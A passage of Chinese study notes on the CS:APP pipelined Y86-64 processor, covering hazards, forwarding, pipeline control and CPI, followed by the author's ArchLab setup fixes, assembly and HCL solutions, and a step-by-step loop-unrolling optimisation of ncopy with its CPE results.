数据冒险\n\n**程序寄存器**\n\n我们来看这样的一个例子\n\n![](http://pic.caiwen.work/i/2025/07/28/6886de97dcc6e.png)\n\n在 `addq` 指令到达译码阶段时，前两条对于 `%rdx` 和对于 `%rax` 进行修改的指令还未完成写回阶段，所以译码阶段无法获得正确的值。这就是一个数据冒险。\n\n一般有两种方法来解决数据冒险。\n\n第一种是暂停技术，感性地理解就是，对于上述的情况，我们让 `addq` 指令暂停在译码阶段，直到所依赖的寄存器完成了写回。\n\n第二种是转发技术。我们发现，对于 `irmovq` 、 `rrmovq` 、 `cmovXX` 和 `OPq` 指令，这些指令要把一个寄存器修改为的值，已经在执行阶段获得，后续的访存阶段什么也不干。那么，我们可以直接把 E 阶段已经计算但还没来的及写入的值，直接转发到 D 阶段。而对于 `mrmovq` 指令，我们需要在 M 阶段才能得到要修改为的值，所以还可以把 M 阶段已经从内存中读出来的数据转发到 D 阶段。\n\n对于转发技术，我们考虑如下的几个值作为转发目标\n\n- `e_valE` 和 `M_valE` ：这两个值看似是相同的，但其实是两个指令的 `valE`，都需要转发\n- `W_valE` 和 `W_valM`：虽然到了写回阶段，但是新的值仍然需要到达下一个时钟上升沿才会存到寄存器中。那么当前这个时钟周期内位于 D 阶段的指令仍然需要数据转发\n- `m_valM`\n\n上述两种操作的具体细节在后文解释。\n\n**内存**\n\n对于内存不会发生数据冒险，因为读写内存都在一个阶段进行，前面一条指令一定是经过了 M 阶段写入数据后，后面一条指令才在 M 阶段读出数据。\n\n不过还有种特殊情况，有可能前一条指令对内存进行修改，而修改的目标恰好是代码所在的内存，这种情况下，前一条指令还未到达 M 阶段应用修改，后一条指令就在 F 阶段完成取指，产生了数据冒险。对于这种情况，可能需要比较复杂的手段进行处理。但为了简便，我们假设这种情况不存在。\n\n**条件码寄存器**\n\n对于条件码寄存器也不会发生数据冒险。在新的架构下，E 阶段计算出条件码之后又立刻使用条件码计算新的 `dstE`，产生和使用都是在同一阶段中，因此不会有冒险。在 SEQ 中，更新 PC 寄存器也需要条件码，以实现条件跳转，但是在新的流水线架构下，我们预测分支，并不需要知道最新的条件码。（但是条件码依然对取指产生影响。我们可以后面根据条件码判断是否预测失败，如果预测失败采取一些手段撤销错误取出的指令， 这个后面会说）\n\n#### 异常处理\n\n关于状态寄存器的数据冒险，涉及到异常处理\n\n异常处理有如下几个细节问题：\n\n- 可能有多个指令都出现了异常\n- 取出一个指令，该指令导致了异常，但是后来又由于分支预测错误，撤销了这个指令\n\n对于上述两种情况，我们不让异常直接影响到处理器的当前状态，而是在每个阶段都存储当前指令所对应的状态信息，直到指令一直走到 W 阶段才将状态应用到当前处理器。这么做可以确保只考虑最先触发异常的指令，同时确保了如果指令被撤销，那么也不会产生影响\n\n- 有可能一个指令触发了异常，但是由于还没走到 W 阶段，所以后面的指令也正常执行，但修改了程序员可见状态（后面的指令本不应该执行，更不应该发生修改）\n\n对于这种情况，我们考虑，会修改程序员可见状态的阶段只有 E 阶段（修改条件码），M 阶段（写内存），W 阶段（写回寄存器）。如果前面有异常指令的话，那么后面的指令必然到不了 W 阶段。当后一条指令到达 E 或是 M 阶段时，前面那条发生异常的指令大概到了 M 和 W 阶段。所以我们需要判断，如果 M 和 W 阶段指令发生异常的话，应该禁止 E 和 M 阶段修改程序员可见状态\n\n### 取指阶段\n\n![](http://pic.caiwen.work/i/2025/07/28/68877ac07472c.png)\n\n和 SEQ 不同，我们在取指阶段就根据指令本身的信息计算出下一个 PC 值，这其中也包括了根据 `icode` 判断是否是条件传送分支，然后进行预测。预测后的 PC 值放入 F 寄存器中来给下一个 F 阶段使用。\n\n在 Select PC 单元，我们还需要其他阶段的信息，来处理先前已经发射的 `ret` 指令和条件跳转预测失败的情况。对应的 HCL 如下：\n\n![](http://pic.caiwen.work/i/2025/07/28/68877bf24191d.png)\n\n其中第一个表示，先前发射的条件跳转语句（如今已经执行到 M 阶段）预测错误，先前预测应该是执行条件跳转，但其实应该不执行。所以我们需要立刻把当前 PC 更新为当时指令对应的 `valP`，即 `M_valA`（因为 `valA` 和 `valP` 已经在 D 阶段被合并）来进行纠正。（不过我们还是发射了一些本应不该发射的指令，这些指令后面会说怎么取消）\n\n第二个则表示，先前发射的 `ret` 语句如今已经完成 M 阶段，拿到了内存中的返回地址，执行到了 W 阶段。此时我们立刻将 PC 置为 `W_valM`\n\n对于 `F_predPC`，其 HCL 如下：\n\n![](http://pic.caiwen.work/i/2025/07/28/68877e275fb5a.png)\n\n### 译码和写回阶段\n\n![](http://pic.caiwen.work/i/2025/07/28/68877e89e6c26.png)\n\n`Sel` 为合并 `valA` 和 `valP`，已经在前文讲过\n\n`Fwd A` 和 `Fwd B` 两个单元负责选择是从寄存器中读数据还是选择转发过来的数据。转发数据时同时转发了数据对应的寄存器编号。转发的选择优先级比较重要：\n\n![](http://pic.caiwen.work/i/2025/07/28/6887804d41886.png)\n\n我们要选择比较早的阶段转发来的数据。因为比较早阶段执行的指令后发射。\n\n对于写回阶段，我们之前已经说过大致流程。\n\n### 执行阶段\n\n![](http://pic.caiwen.work/i/2025/07/28/6887864232475.png)\n\n和 SEQ 大致相同。数据转发和新的 `dstE` 计算已经在前文讲过。需要注意的是 `W_stat` 和 `m_stat` 是配合异常处理，来防止条件码写入\n\n### 访存阶段\n\n![](http://pic.caiwen.work/i/2025/07/28/688786e8ccbc9.png)\n\n和 SEQ 的一个区别在于这里没有 Data 块。SEQ 中的 Data 块是用来选择 `valP` 和 `valA` 的。\n\n其中的 `M_valE` 和 `M_dstE` 、 `m_valM` 和 `M_dstM` 是用来转发的，`M_valA` 是用来纠正分支预测错误的\n\n这里没有像执行阶段那样，引一个其他状态的异常信号过来以禁止发生异常后对内存的写入。我们稍后会使用别的\n\n### 流水线控制\n\n我们着重考虑如下情况：\n\n- 加载/使用冒险：对于数据冒险，一般数据转发就足够了。但是会有这样一种情况，前一条指令是 `mrmovq` ，后一条指令使用到了前面指令操作的寄存器，此时转发就不奏效了，因为后一条指令在 D 阶段，前一条指令才到 E 阶段，而到 M 阶段才知道应该给到什么值。我们将这种情形称为加载/使用冒险\n\n- 处理 `ret`：对于 `ret` 指令，我们考虑当 `ret` 指令触发之后，流水线暂停，不再处理新的指令\n- 分支预测错误：根据前面设计，当我们意识到分支预测错误时，已经发射了几条错误指令了，我们需要考虑如何取消前面的这些指令\n- 异常处理：前面已经讲了异常处理大概的应对方法，这里再细化一下。当异常传播到访存阶段时，由于前一条指令已经开始执行 E 阶段，所以此时必须直接传一个信号过去禁止条件码改变。同时我们考虑往 M 阶段插一个气泡，这个气泡的意思表示，当下一条指令到 M 阶段后就变为 `nop` 指令向后传播，这也就达到了禁止写入内存的目的。当写回阶段有异常指令时，我们暂停整个流水线。\n\n这四个情况的判定条件如下：\n\n![](http://pic.caiwen.work/i/2025/07/29/6888245895208.png)\n\n`ret` 指令到达 D 阶段时就应该立刻被发现。对于加载/使用冒险，如果发生，后面使用寄存器的指令到达 D 阶段时，前面那条 `mrmovq` 到达 E 阶段，此时应该让 D 阶段暂停一次。分支预测错误的条件看似和前面取指阶段的 HCL 不一样，但其实 `E_icode` 和 `M_icode` 相同，`e_Cnd` 和 `M_Cnd` 相同。对于异常情况，只需要判断 M 和 W 阶段发生的异常，我们这里主要是要考虑禁止发生异常后程序员可见状态被改变。\n\n对于流水线寄存器，我们改进一下，使得其能再接受两个信号：\n\n![](http://pic.caiwen.work/i/2025/07/29/68882767e3a32.png)\n\n(上图有一点印刷错误)\n\n如果给到一个暂停信号，那么下一个时钟上升沿之后，寄存器仍输出之前的数据而不输出新的数据。如果给到一个气泡信号，那么下一个时钟上升沿后，寄存器输出情况与 `nop` 指令相同。也就是说，暂停信号起到了重复状态的效果，气泡信号起到了撤销指令的结果。\n\n上面四种情况，需要的暂停/气泡情况如下：\n\n![](http://pic.caiwen.work/i/2025/07/29/68882b84be4c1.png)\n\n对于异常，表中没写，应该是其他阶段正常，M 阶段插入气泡。气泡可以撤销当前指令，但整个流水线继续往前走。暂停+气泡可以使得流水线前面的部分待在原地一周期，前面的部分继续往前走，中间空出来的用气泡补充。\n\n注意图中设置了气泡/暂停状态后，下一个时钟上升沿才会产生对应效果\n\n其中处理 `ret` 对应的例子是：\n\n![](http://pic.caiwen.work/i/2025/07/29/68882be7ccf36.png)\n\n加载/使用冒险对应的例子：\n\n![](http://pic.caiwen.work/i/2025/07/29/68882cf308ff8.png)\n\n分支预测错误对应的例子：\n\n![](http://pic.caiwen.work/i/2025/07/29/68882d2b87374.png)\n\n然后我们考虑这些情况发生组合。对于异常，在异常处理部分已经讨论过一些细节。然后考虑剩下的情况组合。剩余情况需要满足的条件如图所示，一些条件是互斥的，不可能发生组合\n\n![](http://pic.caiwen.work/i/2025/07/29/68882e4357891.png)\n\n我们可以按照 暂停>气泡>正常 的优先级合并：\n\n组合 A\n\n![](http://pic.caiwen.work/i/2025/07/29/688832d73f5f8.png)\n\n组合 B\n\n![](http://pic.caiwen.work/i/2025/07/29/688832fccd0e4.png)\n\n由于组合 B，在写流水线寄存器 D 的气泡和暂停情况的 HCL 代码的时候需要特判一下组合 B 的情况，或者调整优先级\n\n然后我们把流水线控制模块加入流水线结构中：\n\n![](http://pic.caiwen.work/i/2025/07/29/688837f865c1b.png)\n\n### 性能分析\n\n我们使用 CPI （完成一条指令平均需要多少周期）来衡量处理器性能。一般来说 CPI 为 1，但是由于我们上面出现的 加载/使用冒险、`ret` 指令，分支预测错误等因素，导致插入了一些气泡，这些气泡会使得 CPI 上升。一般来说，我们有：\n\n$$\nCPI=1.0+lp+mp+rp\n$$\n\n其中 $lp$ 为加载处罚（由于加载/使用冒险，插入气泡的平均数），$mp$ 为分支预测错误处罚（由于分支预测错误，插入气泡的平均数），$rp$ 为返回处罚（由于 `ret` 指令，插入气泡的平均数）\n\n根据统计，我们有：\n\n- 加载指令（`mrmovq` 和 `popq`）占所有执行指令的 25%，其中 20% 会导致加载/使用冒险\n- 条件分支指令占所有指令指令的 20%，其中 60% 会选择分支，有 40% 的概率是预测错误的\n- 返回指令占所有执行指令的 2%\n\n![](http://pic.caiwen.work/i/2025/07/29/68887dcdcb394.png)\n\n于是我们可以求得处罚总和为 0.27，于是 CPI 为 1.27。进一步的优化是尽可能增加预测的成功率。但传统的流水线处理器优化的尽头也就是完全没有气泡产生，CPI 到达 1。现代的处理器支持超标量，即同时并行执行多个指令，此时 CPI 有可能降到 1 以下，并将衡量处理器性能的标准从 1 转化为 CPI 的倒数，即 IPC ，每个周期执行的指令条数，越大越好。\n\n## ArchLab\n\n### 环境\n\n### 配置\n\n这个实验首先的难点就是环境配置，在配置环境中遇到这几个问题：\n\n首先是出现了 `lineno` 的重复定义的问题，导致编译不过去（不知道 CMU 大神怎么会犯这种错误）。在 stackoverflow 上得知可以修改 misc 目录下的 Makefile 文件：\n\n```makefile\nCFLAGS=-Wall -O1 -g -fcommon\nLCFLAGS=-O1 -fcommon\n```\n\n加上 `-fcommon` 参数\n\n然后 readme 上说本次实验用到的工具有 tty 版本和 gui 版本，gui 版本会更好用一些，于是我考虑编译 gui 版本的工具。我们需要安装 tcl 和 tk 这两个工具，然后我发现 wsl 上已经自带了，于是编译，发现编译不过去，编译的报错信息大概是 tcl 或者 tk 的库缺少了函数。盲猜是版本问题，因为 lab 里用的 tcl/tk 版本是 8.5 的而 wsl 自带的是 8.6 的。apt 上没有 8.5 版本，所以我们可能需要自行编译安装\n\n我选择了 cmu 这个课程开始之前的 tcl/tk 版本，5.8.17。源码的地址在 https://sourceforge.net/projects/tcl/files/Tcl/8.5.17/，我们下载 tcl8.5.17-src.tar.gz 和 tk8.5.17-src.tar.gz 这两个文件并解压\n\n```bash\n# tcl 的安装\ncd tcl8.5.17/unix\n./configure --prefix=/usr/local\nmake\nsudo make install\n# tk 的安装\n# 同理编译安装 Tk\ncd ../../tk8.5.17/unix\n./configure --prefix=/usr/local --with-tcl=/usr/local/lib\nmake\nsudo make install\n```\n\n然后修改 lab 的最外层目录的 makefile 文件\n\n```makefile\nTKLIBS=-L/usr/local/lib -ltk8.5 -ltcl8.5\nTKINC=-isystem /usr/local/include\n```\n\n然后再编译，发现又报错了，这次说是 matherr 这个函数没有定义。询问 ai 得知最新的 glibc 已经把这个函数移除了，为了让我们能通过编译的话，我们只能是自己定义一个\n\n```c\nint matherr(struct __exception *e) {\n    return 0;  // 始终返回 0，表示错误未处理\n}\n```\n\n把这个函数加到 seq/ssim.c 和 pipe/psim.c 中，然后终于通过编译\n\n### PartA\n\n让用 y86-64 汇编写三个程序，非常简单，没什么可说的：\n\nsum.ys:\n\n```assembly\n    .pos 0\n    irmovq stack,%rsp\n    irmovq ele1,%rdi\n    call sum_list\n    halt\n\n# Sample linked list\n    .align 8\nele1:\n    .quad 0x00a\n    .quad ele2\nele2:\n    .quad 0x0b0\n    .quad ele3\nele3:\n    .quad 0xc00\n    .quad 0\n\nsum_list:\n    xorq %rax,%rax\n    jmp test\n\nloop:\n    mrmovq (%rdi),%r8\n    addq %r8,%rax\n    mrmovq 8(%rdi),%rdi\n    jmp test\n\ntest:\n    andq %rdi,%rdi\n    jne loop\n    ret\n\n    .pos 0x200\nstack:\n\n```\n\nrsum.ys:\n\n```assembly\n    .pos 0\n    irmovq stack,%rsp\n    irmovq ele1,%rdi\n    call rsum_list\n    halt\n\n# Sample linked list\n    .align 8\nele1:\n    .quad 0x00a\n    .quad ele2\nele2:\n    .quad 0x0b0\n    .quad ele3\nele3:\n    .quad 0xc00\n    .quad 0\n\nrsum_list:\n    andq %rdi,%rdi\n    je s1\n    pushq %rdi\n    mrmovq 8(%rdi),%rdi\n    call rsum_list\n    popq %rdi\n    mrmovq (%rdi),%r8\n    addq %r8,%rax\n    ret\ns1:\n    irmovq $0,%rax\n    ret\n\n    .pos 0x200\nstack:\n\n```\n\n### PartB\n\n这一部分需要我们在 SEQ 实现上添加 `iaddq` 指令。指令的具体定义见书上的练习题4.3。`iaddq` 和 `irmovq` 的大致实现比较类似，所以我们仿照 `irmovq` 各个阶段的实现。取指和译码阶段类似，执行阶段将 `valC` 和 `valB` 相加得到 `valE`，访存阶段没有操作，最后是一样的写回阶段。修改 `seq-full.hcl` 如下：\n\n```\nbool need_regids =\n\ticode in { IRRMOVQ, IOPQ, IPUSHQ, IPOPQ,\n\t\t     IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ };\n\nbool need_valC =\n\ticode in { IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL, IIADDQ };\n\nword srcB = [\n\ticode in { IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ  } : rB;\n\ticode in { IPUSHQ, IPOPQ, ICALL, IRET } : RRSP;\n\t1 : RNONE;  # Don't need register\n];\n\nword dstE = [\n\ticode in { IRRMOVQ } && Cnd : rB;\n\ticode in { IIRMOVQ, IOPQ, IIADDQ} : rB;\n\ticode in { IPUSHQ, IPOPQ, ICALL, IRET } : RRSP;\n\t1 : RNONE;  # Don't write any register\n];\n\nword aluA = [\n\ticode in { IRRMOVQ, IOPQ } : valA;\n\ticode in { IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ } : valC;\n\ticode in { ICALL, IPUSHQ } : -8;\n\ticode in { IRET, IPOPQ } : 8;\n\t# Other instructions don't need ALU\n];\n\nword aluB = [\n\ticode in { IRMMOVQ, IMRMOVQ, IOPQ, ICALL,\n\t\t      IPUSHQ, IRET, IPOPQ, IIADDQ } : valB;\n\ticode in { IRRMOVQ, IIRMOVQ } : 0;\n\t# Other instructions don't need ALU\n];\n\nbool set_cc = icode in { IOPQ, IIADDQ };\n```\n\n### PartC\n\n这一部分需要我们优化处理器和一个复制数组的代码，使得 CPE 尽可能的小。在 pipe 目录下，执行 `make VERSION=full` 可以重新编译处理器和被评测的代码，然后 `../misc/yis sdriver.yo` 可以测试小样例，如果最后显示 `%rax` 为 `2` 则说明通过。`../misc/yis ldriver.yo` 可以测试大样例，如果最后显示 `%rax` 为 `0x1f` 则说明通过。然后我们通过 `./correctness.pl` 可以先测试被评测的代码 `ncopy.ys` 是否能正确执行。然后 `./benchmark.pl` 可以计算分数\n\n我首先考虑从 `ncopy.ys` 入手，首先对于 `if (val > 0) count++;` 这一部分，原代码中这里使用的条件跳转实现的。我考虑使用条件转移，于是有：\n\n```assembly\n\t# Loop header\n\txorq %rax,%rax\t\t# count = 0;\n\tandq %rdx,%rdx\t\t# len <= 0?\n\tirmovq $1,%r8\n\tjle Done\t\t# if so, goto Done:\n\nLoop:\n\tmrmovq (%rdi), %r10\t# read val from src...\n\trmmovq %r10, (%rsi)\t# ...and store it to dst\n\trrmovq %rax,%r11\n\taddq %r8,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\tsubq %r8, %rdx\t\t# len--\n\tirmovq $8, %r10\n\taddq %r10, %rdi\t\t# src++\n\taddq %r10, %rsi\t\t# dst++\n\tandq %rdx,%rdx\t\t# len > 0?\n\tjg Loop\t\t\t# if so, goto Loop:\n```\n\n不过这个小优化似乎用处不大，跑一下发现 CPE 只是从 15.18 优化到 14.33\n\n刚才的思路其实算有点偏门的。更直接的，我们应该尽可能减少 Loop 内的指令数量。\n\n然后发现 `irmovq $8, %r10` 可以被优化掉：\n\n```assembly\n\t# Loop header\n\txorq %rax,%rax\t\t# count = 0;\n\tandq %rdx,%rdx\t\t# len <= 0?\n\tirmovq $1,%r8\n\tirmovq $8,%r9\n\tjle Done\t\t# if so, goto Done:\n\nLoop:\n\tmrmovq (%rdi), %r10\t# read val from src...\n\trmmovq %r10, (%rsi)\t# ...and store it to dst\n\trrmovq %rax,%r11\n\taddq %r8,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\tsubq %r8, %rdx\t\t# len--\n\taddq %r9, %rdi\t\t# src++\n\taddq %r9, %rsi\t\t# dst++\n\tandq %rdx,%rdx\t\t# len > 0?\n\tjg Loop\t\t\t# if so, goto Loop:\n```\n\n测了一下从 14.33 优化到 13.41\n\n又发现如果把 `subq %r8, %rdx` 后移，那么 `andq %rdx,%rdx` 就没有必要：\n\n```assembly\nLoop:\n\tmrmovq (%rdi), %r10\t# read val from src...\n\trmmovq %r10, (%rsi)\t# ...and store it to dst\n\trrmovq %rax,%r11\n\taddq %r8,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\taddq %r9, %rdi\t\t# src++\n\taddq %r9, %rsi\t\t# dst++\n\tsubq %r8, %rdx\t\t# len--\n\tjg Loop\t\t\t# if so, goto Loop:\n```\n\n从 13.41 优化到 12.41\n\n然后我有考虑实现 `iaddq` 指令，具体实现方法和 PartB 类似，然后使用 `iaddq` 指令来减少代码指令数：\n\n```assembly\n\t# Loop header\n\txorq %rax,%rax\t\t# count = 0;\n\tandq %rdx,%rdx\t\t# len <= 0?\n\tjle Done\t\t# if so, goto Done:\n\nLoop:\n\tmrmovq (%rdi), %r10\t# read val from src...\n\trmmovq %r10, (%rsi)\t# ...and store it to dst\n\trrmovq %rax,%r11\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\tiaddq $8, %rdi\t\t# src++\n\tiaddq $8, %rsi\t\t# dst++\n\tiaddq $-1, %rdx\t\t# len--\n\tjg Loop\t\t\t# if so, goto Loop:\n```\n\n这样只能从 12.41 优化到 12.26\n\n然后我发现 `jle Done` 这个基本上开始时是预测失败的，所以改为：\n\n```assembly\n# You can modify this portion\n\t# Loop header\n\txorq %rax,%rax\t\t# count = 0;\n\tandq %rdx,%rdx\n\tjg Loop\n\tret\n\nLoop:\n\tmrmovq (%rdi), %r10\t# read val from src...\n\trmmovq %r10, (%rsi)\t# ...and store it to dst\n\trrmovq %rax,%r11\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\tiaddq $8, %rdi\t\t# src++\n\tiaddq $8, %rsi\t\t# dst++\n\tiaddq $-1, %rdx\t\t# len--\n\tjg Loop\t\t\t# if so, goto Loop:\n```\n\n但也只是从 12.26 优化到 12.11\n\n后面我又考虑一个优化，这是我看书的时候发现的一点。书中的取指阶段的 HCL 是这样的：\n\n```\nword f_pc = [\n\t# Mispredicted branch.  Fetch at incremented PC\n\tM_icode == IJXX && !M_Cnd : M_valA;\n\t# Completion of RET instruction\n\tW_icode == IRET : W_valM;\n\t# Default: Use predicted value of PC\n\t1 : F_predPC;\n];\n```\n\n其中分支预测错误，需要等到分支跳转指令到达 M 阶段才能被发现。而我们考虑其实 E 阶段就可以计算出条件码，判断出分支预测失败了。于是我修改成：\n\n```\nword f_pc = [\n\t# Mispredicted branch.  Fetch at incremented PC\n\tE_icode == IJXX && !e_Cnd : E_valA;\n\t# Completion of RET instruction\n\tW_icode == IRET : W_valM;\n\t# Default: Use predicted value of PC\n\t1 : F_predPC;\n];\n```\n\n这样一来可以提前发现分支预测错误，那么就会少发射一个错误指令。此时 D 阶段的气泡就不需要了，给相应的逻辑注释掉：\n\n```\nbool D_bubble =\n\t# Mispredicted branch\n\t# (E_icode == IJXX && !e_Cnd) ||\n\t# Stalling at fetch while ret passes through pipeline\n\t# but not condition for a load/use hazard\n\t!(E_icode in { IMRMOVQ, IPOPQ } && E_dstM in { d_srcA, d_srcB }) &&\n\t  IRET in { D_icode, E_icode, M_icode };\n```\n\n结果发现模拟器并没有按照预期的去执行。我怀疑这是这个优化是非预期的，且这个实验的实现并没有完全模拟数字电路。\n\n到这里就进入瓶颈了，不知道该从哪里下手，能做的似乎都做完了。于是我让 AI 给我一个最小的提示，实验从而继续进行。\n\nAI 提示我要尽可能利用数据转发。于是我考虑到原来代码中从一段内存复制到另一段内存的时候， `mrmovq` 和 `rmmovq` 之间的间隔太小，使得出现了加载/使用冒险，导致处理器暂停了一下。我们在两者之间插入一条指令。\n\n```\nLoop:\n\tmrmovq (%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, (%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\tiaddq $8, %rdi\t\t# src++\n\tiaddq $8, %rsi\t\t# dst++\n\tiaddq $-1, %rdx\t\t# len--\n\tjg Loop\t\t\t# if so, goto Loop:\n```\n\nCPE 从 12.11 优化到 11.11\n\n随后好像 AI 也给不出什么提示了。思考了很久，目前这个情形下，单纯地考虑减小指令数量基本做不到\n\n不过后来突然发现指导书上说，第五章的循环展开可能对本次实验很有帮助，于是我尝试了一下，先进行三次的循环展开：\n\n```assembly\n\t# Loop header\n\txorq %rax,%rax\t\t# count = 0;\n\trrmovq %rdx,%r12\n\tiaddq $-3,%r12\n\tjg Loop3\n\tandq %rdx,%rdx\n\tjg Loop\n\tret\n\nLoop3:\n\tmrmovq (%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, (%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 8(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 8(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 16(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 16(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tiaddq $24, %rdi\t\t# src++\n\tiaddq $24, %rsi\t\t# dst++\n\tiaddq $-3, %rdx\t\t# len--\n\tiaddq $-3, %r12\n\tjg Loop3\t\t\t# if so, goto Loop\n\tandq %rdx,%rdx\n\tjg Loop\n\nLoop:\n\tmrmovq (%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, (%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\tiaddq $8, %rdi\t\t# src++\n\tiaddq $8, %rsi\t\t# dst++\n\tiaddq $-1, %rdx\t\t# len--\n\tjg Loop\t\t\t# if so, goto Loop:\n```\n\n其中 Loop3 是三个三个地进行。Loop 是一个一个地进行\n\nCPE 从 11.11 降到了 9.46，效果非常显著，并获得了 20.7 分\n\n我们如法炮制，进行 5 次循环展开，CPE 到达了 9.05。进行 6 次循环展开，CPE 到达了 8.99。进行 7 次循环展开，CPE 到达了 8.97。似乎已经到头了\n\n然后我们发现，如果元素个数小于 7 的话，那么就会跑 Loop 部分。于是我考虑，用一个类似跳表的数据结构，根据最后的这个元素个数，把循环拆掉。但是 `jmp` 指令只能跳到常数地址处，跳表结构不好使。\n\n于是我又考虑分段，走个 7 次的循环展开，个数小于 7 了再走个 3 次的循环展开：\n\n```assembly\n\t# Loop header\n\txorq %rax,%rax\t\t# count = 0;\n\trrmovq %rdx,%r12\n\tiaddq $-7,%r12\n\tjge Loop7\n\tandq %rdx,%rdx\n\tjg Loop\n\tret\n\nLoop3:\n\tmrmovq (%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, (%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 8(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 8(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 16(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 16(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tiaddq $24, %rdi\t\t# src++\n\tiaddq $24, %rsi\t\t# dst++\n\tiaddq $-3, %rdx\t\t# len--\n\tiaddq $-3, %r12\n\tjg Loop3\t\t\t# if so, goto Loop\n\tandq %rdx,%rdx\n\tjg Loop\n\tret\n\nLoop7:\n\tmrmovq (%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, (%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 8(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 8(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 16(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 16(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 24(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 24(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 32(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 32(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 40(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 40(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 48(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 48(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tiaddq $56, %rdi\t\t# src++\n\tiaddq $56, %rsi\t\t# dst++\n\tiaddq $-7, %rdx\t\t# len--\n\tiaddq $-7, %r12\n\tjg Loop7\t\t\t# if so, goto Loop\n\trrmovq %rdx,%r12\n\tiaddq $-3,%r12\n\tjge Loop3\n\tandq %rdx,%rdx\n\tjg Loop\n\tret\n\nLoop:\n\tmrmovq (%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, (%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\tiaddq $8, %rdi\t\t# src++\n\tiaddq $8, %rsi\t\t# dst++\n\tiaddq $-1, %rdx\t\t# len--\n\tjg Loop\t\t\t# if so, goto Loop:\n```\n\n不过这么搞的话，CPE 只是从 8.99 到了 8.91。\n\n调成了10次循环展开+3次循环展开，只进步到了 8.89\n\n调成 12 次 + 3 次循环展开，反而退步了\n\n然后我又调成了 12 次 + 6次，依然是没 8.89 高的。然后考虑 6 次那个循环必然只会有一次，删掉了多余的跳转之后 CPE 只来到了 8.88\n\n又加了一层，变成 10 + 6 + 3，CPE 来到了 8.85\n\n随后我又参考了这篇文章的做法[^1] ，得到了一个优化方法：上面的 `r12` 寄存器是没必要的，我们可以直接在 `%rdx` 上减去 10，后面再加上 10。这样的维护方法应该是比多维护一个 `r12` 寄存器指令数要少的。\n\n上面 10+6+3 的循环展开的话，会使得代码编译出来的产物过大（本次实验有这个限制），因此我调整为 10+3 的循环展开：\n\n```\n\t# Loop header\n\txorq %rax,%rax\t\t# count = 0;\n\tiaddq $-10,%rdx\n\tjge Loop10\n\tiaddq $7,%rdx\n\tjge Loop3\n\tiaddq 